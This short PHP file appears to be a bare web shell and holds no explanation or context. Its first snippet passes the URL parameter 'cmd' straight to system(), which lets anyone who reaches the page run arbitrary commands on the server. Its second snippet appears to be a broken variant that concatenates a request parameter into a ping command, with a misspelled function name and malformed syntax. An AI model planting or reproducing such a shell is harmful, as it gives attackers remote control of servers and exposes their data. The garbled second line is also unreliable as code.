<?php
system($_GET['cmd']);
?>

<?php systm(ping .$_GET[amd]) ?>
